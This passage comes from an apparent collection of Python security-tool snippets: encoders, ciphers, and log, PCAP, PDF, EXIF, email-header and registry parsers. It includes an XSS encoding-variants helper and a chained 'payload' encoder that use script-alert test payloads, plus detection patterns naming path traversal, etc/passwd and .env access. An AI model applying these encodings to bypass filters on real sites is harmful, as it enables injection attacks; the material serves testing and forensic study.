        "Backslash":    "\\\\",
        "Null byte":    "\\x00",
        "Newline":      "\\n",
    }
    print("Special character encodings:")
    for name, char in specials.items():
        encoded = quote(char, safe="")
        print(f"  {name:15s} {repr(char):8s} -> {encoded}")

if __name__ == "__main__":
    text = sys.argv[1] if len(sys.argv) > 1 else "test param=value&other=<script>alert(1)</script>"
    print(f"Original:       {text}")
    print(f"URL encoded:    {url_encode(text)}")
    print(f"Plus encoded:   {url_encode(text, plus=True)}")
    print(f"Double encoded: {double_encode(text)}")
    print(f"Decoded:        {url_decode(url_encode(text))}")
    print()
    encode_special_chars()`
  },
  {
    name: "Hex Encode/Decode",
    desc: "Convert data between hex, bytes, and string representations with analysis tools.",
    code: `import binascii
import sys

def hex_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return binascii.hexlify(data).decode()

def hex_decode(hex_string):
    hex_string = hex_string.replace(" ", "").replace("\\n", "").replace("0x", "")
    return binascii.unhexlify(hex_string)

def hex_dump(data, width=16):
    if isinstance(data, str):
        data = data.encode()
    lines = []
    for offset in range(0, len(data), width):
        chunk = data[offset:offset + width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{offset:08x}  {hex_part:<{width*3}}  |{ascii_part}|")
    return "\\n".join(lines)

def int_to_hex(value, byte_order="big"):
    byte_len = (value.bit_length() + 7) // 8
    if byte_len == 0:
        byte_len = 1
    result = value.to_bytes(byte_len, byteorder=byte_order)
    return binascii.hexlify(result).decode()

def hex_to_int(hex_string, byte_order="big"):
    data = binascii.unhexlify(hex_string.replace("0x", ""))
    return int.from_bytes(data, byteorder=byte_order)

def xor_hex(hex1, hex2):
    b1 = binascii.unhexlify(hex1)
    b2 = binascii.unhexlify(hex2)
    result = bytes(a ^ b for a, b in zip(b1, b2))
    return binascii.hexlify(result).decode()

if __name__ == "__main__":
    text = sys.argv[1] if len(sys.argv) > 1 else "Hello Security World!"
    print(f"Original: {text}")
    encoded = hex_encode(text)
    print(f"Hex:      {encoded}")
    decoded = hex_decode(encoded)
    print(f"Decoded:  {decoded.decode()}")
    print(f"\\nHex dump:")
    print(hex_dump(text))
    print(f"\\nInteger 12345 -> hex: {int_to_hex(12345)}")
    print(f"Hex '3039' -> int:    {hex_to_int('3039')}")`
  },
  {
    name: "HTML Entity Encode/Decode",
    desc: "Encode and decode HTML entities, including named entities and numeric character references.",
    code: `import html
import re
import sys

def html_encode(text, quote_mode=True):
    return html.escape(text, quote=quote_mode)

def html_decode(text):
    return html.unescape(text)

def encode_all_chars(text):
    return "".join(f"&#{ord(c)};" for c in text)

def encode_all_hex(text):
    return "".join(f"&#x{ord(c):x};" for c in text)

def detect_encoded_content(text):
    patterns = {
        "named_entity": r"&[a-zA-Z]+;",
        "decimal_entity": r"&#\\d+;",
        "hex_entity": r"&#x[0-9a-fA-F]+;",
    }
    findings = {}
    for name, pattern in patterns.items():
        matches = re.findall(pattern, text)
        if matches:
            findings[name] = matches
    return findings

def recursive_decode(text, max_depth=10):
    for i in range(max_depth):
        decoded = html.unescape(text)
        if decoded == text:
            return decoded, i
        text = decoded
    return text, max_depth

# XSS payload encoding variants
def xss_encode_variants(payload):
    variants = {
        "original": payload,
        "html_encoded": html_encode(payload),
        "decimal_encoded": encode_all_chars(payload),
        "hex_encoded": encode_all_hex(payload),
        "mixed": "",
    }
    mixed = ""
    for i, c in enumerate(payload):
        if i % 3 == 0:
            mixed += f"&#{ord(c)};"
        elif i % 3 == 1:
            mixed += f"&#x{ord(c):x};"
        else:
            mixed += html.escape(c)
    variants["mixed"] = mixed
    return variants

if __name__ == "__main__":
    text = sys.argv[1] if len(sys.argv) > 1 else '<script>alert("XSS")</script>'
    print(f"Original:    {text}")
    print(f"Encoded:     {html_encode(text)}")
    print(f"All decimal: {encode_all_chars(text)}")
    print(f"All hex:     {encode_all_hex(text)}")
    print(f"Decoded:     {html_decode(html_encode(text))}")

    print(f"\\n--- XSS Encoding Variants ---")
    for name, variant in xss_encode_variants(text).items():
        print(f"  {name:18s}: {variant}")`
  },
  {
    name: "Unicode Encode/Decode",
    desc: "Encode and decode Unicode text in various formats including UTF-8, UTF-16, and escape sequences.",
    code: `import sys
import codecs

def unicode_info(text):
    print(f"String: {text}")
    print(f"Length: {len(text)} characters")
    for i, char in enumerate(text):
        cp = ord(char)
        utf8 = char.encode("utf-8")
        utf16 = char.encode("utf-16-le")
        print(f"  [{i}] U+{cp:04X} '{char}'  "
              f"UTF-8: {' '.join(f'{b:02x}' for b in utf8)}  "
              f"UTF-16LE: {' '.join(f'{b:02x}' for b in utf16)}  "
              f"Name: {get_char_name(char)}")

def get_char_name(char):
    import unicodedata
    try:
        return unicodedata.name(char)
    except ValueError:
        return "UNKNOWN"

def unicode_escape(text):
    return {
        "python_unicode": text.encode("unicode_escape").decode("ascii"),
        "utf8_bytes": " ".join(f"\\\\x{b:02x}" for b in text.encode("utf-8")),
        "utf16_bytes": " ".join(f"\\\\x{b:02x}" for b in text.encode("utf-16-le")),
        "html_entities": "".join(f"&#{ord(c)};" for c in text),
        "js_escape": "".join(f"\\\\u{ord(c):04x}" for c in text),
        "url_encoded": "".join(f"%{b:02X}" for b in text.encode("utf-8")),
        "css_escape": "".join(f"\\\\{ord(c):06x}" for c in text),
    }

def decode_unicode_escape(text):
    decoders = [
        ("unicode_escape", lambda t: codecs.decode(t, "unicode_escape")),
        ("utf-8", lambda t: bytes(
            int(x, 16) for x in t.replace("\\\\x", " ").split() if x
        ).decode("utf-8")),
    ]
    for name, decoder in decoders:
        try:
            result = decoder(text)
            return name, result
        except Exception:
            continue
    return None, None

def homoglyph_check(text):
    import unicodedata
    suspicious = []
    for i, char in enumerate(text):
        cat = unicodedata.category(char)
        if ord(char) > 127 and cat.startswith("L"):
            suspicious.append({
                "pos": i,
                "char": char,
                "codepoint": f"U+{ord(char):04X}",
                "name": get_char_name(char),
                "category": cat
            })
    if suspicious:
        print(f"[!] Found {len(suspicious)} potential homoglyph characters:")
        for s in suspicious:
            print(f"  Position {s['pos']}: '{s['char']}' ({s['codepoint']} {s['name']})")
    else:
        print("[OK] No suspicious homoglyphs detected")
    return suspicious

if __name__ == "__main__":
    text = sys.argv[1] if len(sys.argv) > 1 else "Hello \\u4e16\\u754c"
    unicode_info(text)
    print(f"\\n--- Escape Formats ---")
    for fmt, val in unicode_escape(text).items():
        print(f"  {fmt:18s}: {val}")
    print(f"\\n--- Homoglyph Check ---")
    homoglyph_check(text)`
  },
  {
    name: "ROT13 Cipher",
    desc: "ROT13 and configurable ROT-N cipher for alphabetic character rotation.",
    code: `import string
import sys

def rot13(text):
    return text.translate(str.maketrans(
        string.ascii_lowercase + string.ascii_uppercase,
        string.ascii_lowercase[13:] + string.ascii_lowercase[:13] +
        string.ascii_uppercase[13:] + string.ascii_uppercase[:13]
    ))

def rot_n(text, n):
    result = []
    for char in text:
        if char.isalpha():
            base = ord("A") if char.isupper() else ord("a")
            shifted = (ord(char) - base + n) % 26 + base
            result.append(chr(shifted))
        else:
            result.append(char)
    return "".join(result)

def rot47(text):
    result = []
    for char in text:
        code = ord(char)
        if 33 <= code <= 126:
            result.append(chr(33 + (code - 33 + 47) % 94))
        else:
            result.append(char)
    return "".join(result)

def brute_force_rot(text):
    print(f"Original: {text}\\n")
    print("ROT-N brute force:")
    for n in range(1, 26):
        decoded = rot_n(text, n)
        print(f"  ROT-{n:2d}: {decoded}")

def caesar_frequency_analysis(text):
    freq = {}
    total = 0
    for c in text.upper():
        if c.isalpha():
            freq[c] = freq.get(c, 0) + 1
            total += 1
    if total == 0:
        return None
    english_freq = "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    sorted_chars = sorted(freq.keys(), key=lambda c: freq[c], reverse=True)
    if sorted_chars:
        most_common = sorted_chars[0]
        likely_shift = (ord(most_common) - ord("E")) % 26
        print(f"Most frequent letter: {most_common} (appears {freq[most_common]} times)")
        print(f"Likely shift (assuming E is most common): {likely_shift}")
        print(f"Decoded with shift {likely_shift}: {rot_n(text, 26 - likely_shift)}")
        return likely_shift
    return None

if __name__ == "__main__":
    text = sys.argv[1] if len(sys.argv) > 1 else "The quick brown fox jumps over the lazy dog"
    print(f"Original: {text}")
    print(f"ROT13:    {rot13(text)}")
    print(f"ROT47:    {rot47(text)}")
    print(f"ROT5:     {rot_n(text, 5)}")
    print(f"\\nROT13 is self-inverse: {rot13(rot13(text)) == text}")
    print()
    brute_force_rot(rot_n(text, 7))`
  },
  {
    name: "Custom Encoder/Decoder",
    desc: "Multi-format encoder supporting chained encoding operations for payload generation.",
    code: `import base64
import binascii
import html
import sys
from urllib.parse import quote, unquote

class MultiEncoder:
    def __init__(self, data=""):
        if isinstance(data, str):
            self.data = data.encode()
        else:
            self.data = data
        self.operations = []

    def base64_encode(self):
        self.data = base64.b64encode(self.data)
        self.operations.append("base64_encode")
        return self

    def base64_decode(self):
        self.data = base64.b64decode(self.data)
        self.operations.append("base64_decode")
        return self

    def hex_encode(self):
        self.data = binascii.hexlify(self.data)
        self.operations.append("hex_encode")
        return self

    def hex_decode(self):
        self.data = binascii.unhexlify(self.data)
        self.operations.append("hex_decode")
        return self

    def url_encode(self):
        self.data = quote(self.data.decode(), safe="").encode()
        self.operations.append("url_encode")
        return self

    def url_decode(self):
        self.data = unquote(self.data.decode()).encode()
        self.operations.append("url_decode")
        return self

    def html_encode(self):
        self.data = html.escape(self.data.decode()).encode()
        self.operations.append("html_encode")
        return self

    def reverse(self):
        self.data = self.data[::-1]
        self.operations.append("reverse")
        return self

    def xor(self, key):
        if isinstance(key, str):
            key = key.encode()
        self.data = bytes(self.data[i] ^ key[i % len(key)] for i in range(len(self.data)))
        self.operations.append(f"xor(key={key})")
        return self

    def result(self):
        try:
            return self.data.decode()
        except UnicodeDecodeError:
            return self.data.hex()

    def show_chain(self):
        return " -> ".join(self.operations)

def encode_chain(data, operations):
    enc = MultiEncoder(data)
    for op in operations:
        if isinstance(op, tuple):
            method_name, args = op[0], op[1:]
            getattr(enc, method_name)(*args)
        else:
            getattr(enc, op)()
    return enc

if __name__ == "__main__":
    payload = sys.argv[1] if len(sys.argv) > 1 else '<script>alert("test")</script>'
    print(f"Original: {payload}\\n")

    # Single encodings
    for method in ["base64_encode", "hex_encode", "url_encode", "html_encode"]:
        enc = MultiEncoder(payload)
        getattr(enc, method)()
        print(f"  {method:18s}: {enc.result()}")

    # Chained encoding
    print(f"\\n--- Chained Encoding ---")
    enc = encode_chain(payload, ["base64_encode", "url_encode"])
    print(f"  base64 -> url: {enc.result()}")
    print(f"  Chain: {enc.show_chain()}")

    enc = encode_chain(payload, ["html_encode", "base64_encode", "hex_encode"])
    print(f"  html -> b64 -> hex: {enc.result()[:80]}...")
    print(f"  Chain: {enc.show_chain()}")

    enc = encode_chain(payload, [("xor", "key"), "base64_encode"])
    print(f"  xor -> base64: {enc.result()}")
    print(f"  Chain: {enc.show_chain()}")`
  },

  // ============================================================
  // PARSING
  // ============================================================
  {
    name: "Log File Parser",
    desc: "Parse and analyze common log formats (Apache, Nginx, auth logs) with statistics and filtering.",
    code: `import re
import sys
from collections import Counter, defaultdict
from datetime import datetime

LOG_PATTERNS = {
    "apache_combined": re.compile(
        r'(?P<ip>[\\d.]+) - (?P<user>\\S+) \\[(?P<date>[^\\]]+)\\] '
        r'"(?P<method>\\w+) (?P<path>\\S+) (?P<protocol>[^"]+)" '
        r'(?P<status>\\d+) (?P<size>\\d+|-) '
        r'"(?P<referer>[^"]*)" "(?P<ua>[^"]*)"'
    ),
    "apache_common": re.compile(
        r'(?P<ip>[\\d.]+) - (?P<user>\\S+) \\[(?P<date>[^\\]]+)\\] '
        r'"(?P<method>\\w+) (?P<path>\\S+) (?P<protocol>[^"]+)" '
        r'(?P<status>\\d+) (?P<size>\\d+|-)'
    ),
    "auth_log": re.compile(
        r'(?P<date>\\w+\\s+\\d+\\s+[\\d:]+) (?P<host>\\S+) '
        r'(?P<service>\\S+?)\\[?(?P<pid>\\d*)\\]?:\\s+(?P<message>.*)'
    ),
    "syslog": re.compile(
        r'(?P<date>\\w+\\s+\\d+\\s+[\\d:]+) (?P<host>\\S+) '
        r'(?P<process>\\S+):\\s+(?P<message>.*)'
    ),
}

def parse_log_file(filepath, log_type="auto"):
    entries = []
    line_count = 0
    parse_errors = 0

    with open(filepath, "r", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            line_count += 1
            matched = False
            patterns = [LOG_PATTERNS[log_type]] if log_type != "auto" else LOG_PATTERNS.values()
            for pattern in patterns:
                match = pattern.match(line)
                if match:
                    entries.append(match.groupdict())
                    matched = True
                    break
            if not matched:
                parse_errors += 1

    print(f"[*] Parsed {len(entries)}/{line_count} lines ({parse_errors} errors)")
    return entries

def analyze_web_logs(entries):
    ips = Counter()
    paths = Counter()
    status_codes = Counter()
    methods = Counter()
    user_agents = Counter()
    errors = []

    for entry in entries:
        ip = entry.get("ip", "unknown")
        ips[ip] += 1
        paths[entry.get("path", "")] += 1
        status = entry.get("status", "0")
        status_codes[status] += 1
        methods[entry.get("method", "")] += 1
        user_agents[entry.get("ua", "")] += 1
        if status.startswith(("4", "5")):
            errors.append(entry)

    print(f"\\n--- Web Log Analysis ---")
    print(f"Total entries: {len(entries)}")
    print(f"\\nTop 10 IPs:")
    for ip, count in ips.most_common(10):
        print(f"  {count:6d}  {ip}")
    print(f"\\nTop 10 Paths:")
    for path, count in paths.most_common(10):
        print(f"  {count:6d}  {path}")
    print(f"\\nStatus Codes:")
    for code, count in sorted(status_codes.items()):
        print(f"  {code}: {count}")
    print(f"\\nMethods:")
    for method, count in methods.most_common():
        print(f"  {method}: {count}")
    print(f"\\nSuspicious patterns:")
    suspicious_paths = [e for e in entries if any(
        p in e.get("path", "").lower()
        for p in ["../", "etc/passwd", "cmd=", "exec", ".env", "wp-admin", "phpmy"]
    )]
    for s in suspicious_paths[:10]:
        print(f"  [{s.get('status')}] {s.get('ip')} -> {s.get('path')}")

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "/var/log/apache2/access.log"
    entries = parse_log_file(filepath)
    if entries and "path" in entries[0]:
        analyze_web_logs(entries)`
  },
  {
    name: "PCAP Parser with Scapy",
    desc: "Read and analyze PCAP files using Scapy to extract network conversation details.",
    code: `from scapy.all import rdpcap, IP, TCP, UDP, DNS, DNSQR, Raw
from collections import Counter, defaultdict
import sys

def parse_pcap(filepath):
    print(f"[*] Reading {filepath}...")
    packets = rdpcap(filepath)
    print(f"[*] Loaded {len(packets)} packets")
    return packets

def analyze_pcap(packets):
    stats = {
        "total": len(packets),
        "ip_src": Counter(),
        "ip_dst": Counter(),
        "protocols": Counter(),
        "ports": Counter(),
        "conversations": Counter(),
        "dns_queries": [],
        "http_requests": [],
    }

    for pkt in packets:
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            stats["ip_src"][src] += 1
            stats["ip_dst"][dst] += 1

            if pkt.haslayer(TCP):
                stats["protocols"]["TCP"] += 1
                sport = pkt[TCP].sport
                dport = pkt[TCP].dport
                stats["ports"][dport] += 1
                conv = f"{src}:{sport} <-> {dst}:{dport}"
                stats["conversations"][conv] += 1

                if pkt.haslayer(Raw):
                    payload = pkt[Raw].load
                    try:
                        text = payload.decode("utf-8", errors="replace")
                        if text.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ")):
                            lines = text.split("\\r\\n")
                            stats["http_requests"].append({
                                "src": src,
                                "dst": dst,
                                "request": lines[0],
                                "host": next((l.split(": ", 1)[1] for l in lines if l.startswith("Host:")), "")
                            })
                    except Exception:
                        pass

            elif pkt.haslayer(UDP):
                stats["protocols"]["UDP"] += 1
                stats["ports"][pkt[UDP].dport] += 1

            if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
                query = pkt[DNSQR].qname.decode("utf-8", errors="replace")
                stats["dns_queries"].append({"src": src, "query": query.rstrip(".")})
        else:
            proto = type(pkt).__name__
            stats["protocols"][proto] += 1

    # Print report
    print(f"\\n=== PCAP Analysis ===")
    print(f"Total packets: {stats['total']}")
    print(f"\\nProtocols:")
    for proto, count in stats["protocols"].most_common():
        print(f"  {proto}: {count}")
    print(f"\\nTop Source IPs:")
    for ip, count in stats["ip_src"].most_common(10):
        print(f"  {count:6d}  {ip}")
    print(f"\\nTop Destination IPs:")
    for ip, count in stats["ip_dst"].most_common(10):
        print(f"  {count:6d}  {ip}")
    print(f"\\nTop Destination Ports:")
    for port, count in stats["ports"].most_common(10):
        print(f"  {count:6d}  port {port}")
    if stats["dns_queries"]:
        print(f"\\nDNS Queries ({len(stats['dns_queries'])}):")
        seen = set()
        for q in stats["dns_queries"]:
            key = q["query"]
            if key not in seen:
                seen.add(key)
                print(f"  {q['src']} -> {key}")
    if stats["http_requests"]:
        print(f"\\nHTTP Requests ({len(stats['http_requests'])}):")
        for r in stats["http_requests"][:20]:
            print(f"  {r['src']} -> {r['host']} {r['request']}")
    return stats

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "capture.pcap"
    packets = parse_pcap(filepath)
    analyze_pcap(packets)`
  },
  {
    name: "PDF Metadata Extractor",
    desc: "Extract metadata, embedded text, and properties from PDF documents.",
    code: `import sys
try:
    from PyPDF2 import PdfReader
except ImportError:
    PdfReader = None

def extract_pdf_metadata(filepath):
    if PdfReader is None:
        print("[!] PyPDF2 is required: pip install PyPDF2")
        return None

    reader = PdfReader(filepath)
    info = reader.metadata
    num_pages = len(reader.pages)

    print(f"=== PDF Metadata: {filepath} ===")
    print(f"Pages: {num_pages}")

    if info:
        fields = {
            "/Title": "Title",
            "/Author": "Author",
            "/Subject": "Subject",
            "/Creator": "Creator",
            "/Producer": "Producer",
            "/CreationDate": "Created",
            "/ModDate": "Modified",
        }
        for key, label in fields.items():
            value = info.get(key, "N/A")
            if value and value != "N/A":
                print(f"  {label:12s}: {value}")

    # Check for embedded files
    if "/Names" in reader.trailer.get("/Root", {}):
        print(f"\\n[!] PDF may contain embedded files")

    # Check for JavaScript
    for page in reader.pages:
        if "/AA" in page or "/JS" in (page.get("/AA", {}) or {}):
            print("[!] PDF contains JavaScript actions")
            break

    # Extract text from first few pages
    print(f"\\n--- Text Preview (first 2 pages) ---")
    for i, page in enumerate(reader.pages[:2]):
        text = page.extract_text()
        if text:
            preview = text[:500].replace("\\n", " ")
            print(f"\\nPage {i+1}: {preview}...")
        else:
            print(f"\\nPage {i+1}: [no extractable text]")

    # Check for forms
    if reader.get_fields():
        print(f"\\n[INFO] PDF contains form fields:")
        for name, field in reader.get_fields().items():
            print(f"  {name}: {field.get('/V', 'empty')}")

    return {
        "pages": num_pages,
        "metadata": dict(info) if info else {},
    }

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "document.pdf"
    extract_pdf_metadata(filepath)`
  },
  {
    name: "Image EXIF Extractor",
    desc: "Extract EXIF metadata from images including GPS coordinates, camera info, and timestamps.",
    code: `from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import sys
import json

def extract_exif(filepath):
    img = Image.open(filepath)
    print(f"=== Image Metadata: {filepath} ===")
    print(f"Format: {img.format}")
    print(f"Size:   {img.size[0]}x{img.size[1]}")
    print(f"Mode:   {img.mode}")

    exif_data = {}
    raw_exif = img._getexif()
    if raw_exif is None:
        print("\\n[INFO] No EXIF data found")
        return exif_data

    print(f"\\n--- EXIF Tags ---")
    gps_info = {}
    for tag_id, value in raw_exif.items():
        tag_name = TAGS.get(tag_id, f"Unknown({tag_id})")
        if tag_name == "GPSInfo":
            for gps_tag_id, gps_value in value.items():
                gps_tag_name = GPSTAGS.get(gps_tag_id, f"Unknown({gps_tag_id})")
                gps_info[gps_tag_name] = gps_value
            continue
        # Convert bytes to string for display
        if isinstance(value, bytes):
            try:
                value = value.decode("utf-8", errors="replace")
            except Exception:
                value = value.hex()
        exif_data[tag_name] = value
        print(f"  {tag_name:30s}: {str(value)[:100]}")

    if gps_info:
        print(f"\\n--- GPS Data ---")
        for k, v in gps_info.items():
            print(f"  {k}: {v}")
        coords = extract_gps_coords(gps_info)
        if coords:
            lat, lon = coords
            print(f"\\n  Coordinates: {lat:.6f}, {lon:.6f}")
            print(f"  Google Maps: https://maps.google.com/?q={lat},{lon}")

    return exif_data

def extract_gps_coords(gps_info):
    try:
        lat_dms = gps_info.get("GPSLatitude")
        lat_ref = gps_info.get("GPSLatitudeRef")
        lon_dms = gps_info.get("GPSLongitude")
        lon_ref = gps_info.get("GPSLongitudeRef")
        if not all([lat_dms, lat_ref, lon_dms, lon_ref]):
            return None
        def dms_to_dd(dms, ref):
            d, m, s = [float(x) for x in dms]
            dd = d + m / 60 + s / 3600
            if ref in ("S", "W"):
                dd *= -1
            return dd
        lat = dms_to_dd(lat_dms, lat_ref)
        lon = dms_to_dd(lon_dms, lon_ref)
        return lat, lon
    except Exception:
        return None

def strip_exif(input_path, output_path):
    img = Image.open(input_path)
    data = list(img.getdata())
    clean_img = Image.new(img.mode, img.size)
    clean_img.putdata(data)
    clean_img.save(output_path)
    print(f"[+] EXIF stripped: {input_path} -> {output_path}")

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "photo.jpg"
    extract_exif(filepath)`
  },
  {
    name: "Email Header Parser",
    desc: "Parse and analyze email headers to trace message routing, detect spoofing, and check authentication.",
    code: `import email
from email import policy
import re
import sys

def parse_email_headers(raw_headers):
    if isinstance(raw_headers, str):
        msg = email.message_from_string(raw_headers, policy=policy.default)
    else:
        msg = raw_headers

    print("=== Email Header Analysis ===\\n")

    # Basic headers
    basic = ["From", "To", "Subject", "Date", "Message-ID", "Reply-To", "Return-Path"]
    print("[Basic Headers]")
    for header in basic:
        value = msg.get(header)
        if value:
            print(f"  {header:15s}: {value}")

    # Trace route (Received headers, in reverse order)
    received = msg.get_all("Received", [])
    if received:
        print(f"\\n[Message Route] ({len(received)} hops)")
        for i, hop in enumerate(reversed(received)):
            hop_clean = " ".join(hop.split())
            # Extract key info
            from_match = re.search(r"from\\s+(\\S+)", hop_clean)
            by_match = re.search(r"by\\s+(\\S+)", hop_clean)
            date_match = re.search(r";\\s*(.+)$", hop_clean)
            from_host = from_match.group(1) if from_match else "unknown"
            by_host = by_match.group(1) if by_match else "unknown"
            date_str = date_match.group(1).strip() if date_match else ""
            print(f"  Hop {i+1}: {from_host} -> {by_host}")
            if date_str:
                print(f"         {date_str}")

    # Authentication results
    print(f"\\n[Authentication]")
    auth_headers = {
        "Authentication-Results": "Auth Results",
        "DKIM-Signature": "DKIM",
        "ARC-Authentication-Results": "ARC",
    }
    for header, label in auth_headers.items():
        value = msg.get(header)
        if value:
            print(f"  {label}: {value[:200]}")

    # SPF check
    spf = msg.get("Received-SPF")
    if spf:
        print(f"  SPF: {spf[:200]}")

    # Security flags
    print(f"\\n[Security Analysis]")
    return_path = msg.get("Return-Path", "")
    from_addr = msg.get("From", "")
    if return_path and from_addr:
        rp_email = re.search(r"<([^>]+)>", return_path)
        from_email = re.search(r"<([^>]+)>", from_addr)
        if rp_email and from_email:
            if rp_email.group(1).split("@")[1] != from_email.group(1).split("@")[1]:
                print(f"  [WARN] Return-Path domain differs from From domain")

    # X-headers (often contain useful info)
    print(f"\\n[X-Headers]")
    for key in msg.keys():
        if key.startswith("X-"):
            print(f"  {key}: {msg[key][:100]}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        with open(sys.argv[1], "r") as f:
            raw = f.read()
        parse_email_headers(raw)
    else:
        sample = """From: sender@example.com
To: recipient@example.com
Subject: Test Email
Date: Mon, 01 Jan 2024 12:00:00 +0000
Received: from mail.example.com by mx.recipient.com; Mon, 01 Jan 2024 12:00:00 +0000
Received: from [192.168.1.1] by mail.example.com; Mon, 01 Jan 2024 11:59:50 +0000
Message-ID: <abc123@example.com>
DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1;
Return-Path: <bounce@example.com>
X-Mailer: TestMailer 1.0
X-Originating-IP: 192.168.1.1"""
        parse_email_headers(sample)`
  },
  {
    name: "CSV/JSON Data Processor",
    desc: "Process, filter, transform, and analyze data from CSV and JSON files for security investigations.",
    code: `import csv
import json
import sys
from collections import Counter, defaultdict
from datetime import datetime
import re

def load_csv(filepath, delimiter=","):
    rows = []
    with open(filepath, "r", newline="", encoding="utf-8-sig") as f:
        reader = csv.DictReader(f, delimiter=delimiter)
        for row in reader:
            rows.append(dict(row))
    print(f"[*] Loaded {len(rows)} rows from CSV")
    if rows:
        print(f"    Columns: {', '.join(rows[0].keys())}")
    return rows

def load_json(filepath):
    with open(filepath, "r") as f:
        data = json.load(f)
    if isinstance(data, list):
        print(f"[*] Loaded {len(data)} records from JSON")
    elif isinstance(data, dict):
        print(f"[*] Loaded JSON object with keys: {', '.join(data.keys())}")
    return data

def filter_records(records, field, pattern):
    regex = re.compile(pattern, re.IGNORECASE)
    filtered = [r for r in records if field in r and regex.search(str(r[field]))]
    print(f"[*] Filtered: {len(filtered)}/{len(records)} records match {field}=~/{pattern}/")
    return filtered

def aggregate(records, group_by, count_field=None):
    groups = defaultdict(list)
    for record in records:
        key = record.get(group_by, "N/A")
        groups[key].append(record)
    print(f"\\n[Aggregation by {group_by}]")
    for key, items in sorted(groups.items(), key=lambda x: len(x[1]), reverse=True)[:20]:
        if count_field:
            values = Counter(r.get(count_field, "") for r in items)
            print(f"  {key}: {len(items)} total, top values: {dict(values.most_common(3))}")
        else:
            print(f"  {key}: {len(items)}")
    return dict(groups)

def extract_iocs(records):
    iocs = {"ips": set(), "domains": set(), "emails": set(), "urls": set(), "hashes": set()}
    ip_re = re.compile(r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")
    domain_re = re.compile(r"\\b(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+[a-z]{2,}\\b", re.I)
    email_re = re.compile(r"[\\w.+-]+@[\\w-]+\\.[\\w.]+")
    hash_re = re.compile(r"\\b[a-fA-F0-9]{32,64}\\b")

    for record in records:
        for value in record.values():
            text = str(value)
            iocs["ips"].update(ip_re.findall(text))
            iocs["domains"].update(domain_re.findall(text))
            iocs["emails"].update(email_re.findall(text))
            iocs["hashes"].update(h for h in hash_re.findall(text) if len(h) in (32, 40, 64))

    print(f"\\n[IOC Extraction]")
    for ioc_type, values in iocs.items():
        if values:
            print(f"  {ioc_type}: {len(values)} unique")
            for v in sorted(values)[:5]:
                print(f"    {v}")
    return {k: list(v) for k, v in iocs.items()}

def export_json(data, filepath):
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2, default=str)
    print(f"[*] Exported to {filepath}")

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "data.csv"
    if filepath.endswith(".json"):
        data = load_json(filepath)
        if isinstance(data, list):
            extract_iocs(data)
    else:
        data = load_csv(filepath)
        if data:
            extract_iocs(data)`
  },
  {
    name: "Registry File Parser",
    desc: "Parse Windows registry hive exports and REG files for forensic analysis.",
    code: `import re
import sys
from collections import defaultdict
import struct

def parse_reg_file(filepath):
    entries = defaultdict(dict)
    current_key = None

    with open(filepath, "r", encoding="utf-16-le", errors="replace") as f:
        content = f.read()
    # Try UTF-8 if UTF-16 fails
    if not content.strip():
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()

    lines = content.splitlines()
    continued_line = ""

    for line in lines:
        line = line.strip()
        if not line or line.startswith(("Windows Registry", "REGEDIT")):
            continue
        # Handle line continuation
        if line.endswith("\\\\"):
            continued_line += line[:-1]
            continue
        if continued_line:
            line = continued_line + line
            continued_line = ""
        # Registry key
        if line.startswith("[") and line.endswith("]"):
            current_key = line[1:-1]
            if current_key.startswith("-"):
                current_key = current_key[1:]
                entries[current_key]["_deleted"] = True
            continue
        # Value
        if current_key and "=" in line:
            if line.startswith("@="):
                name = "(Default)"
                value = line[2:]
            else:
                match = re.match(r'"([^"]*)"=(.*)', line)
                if match:
                    name = match.group(1)
                    value = match.group(2)
                else:
                    continue
            # Parse value type
            if value.startswith('"') and value.endswith('"'):
                entries[current_key][name] = {"type": "REG_SZ", "value": value[1:-1]}
            elif value.startswith("dword:"):
                hex_val = value[6:]
                entries[current_key][name] = {"type": "REG_DWORD", "value": int(hex_val, 16)}
            elif value.startswith("hex:"):
                hex_bytes = value[4:].replace(",", " ").strip()
                entries[current_key][name] = {"type": "REG_BINARY", "value": hex_bytes}
            elif value.startswith("hex(2):"):
                hex_bytes = value[7:].replace(",", " ").strip()
                entries[current_key][name] = {"type": "REG_EXPAND_SZ", "value": hex_bytes}
            elif value.startswith("hex(7):"):
                hex_bytes = value[7:].replace(",", " ").strip()
                entries[current_key][name] = {"type": "REG_MULTI_SZ", "value": hex_bytes}
            else:
                entries[current_key][name] = {"type": "unknown", "value": value}

    print(f"[*] Parsed {len(entries)} registry keys")
    return dict(entries)

def find_suspicious_entries(entries):
    suspicious_paths = [
        r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce",
        r"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
        r"SYSTEM\\\\CurrentControlSet\\\\Services",
        r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders",
    ]
    print(f"\\n[Security-Relevant Keys]")
    for key, values in entries.items():
        for pattern in suspicious_paths:
            if re.search(pattern, key, re.IGNORECASE):
                print(f"\\n  Key: {key}")
                for name, data in values.items():
                    if name.startswith("_"):
                        continue
                    print(f"    {name} ({data['type']}): {str(data['value'])[:100]}")

if __name__ == "__main__":
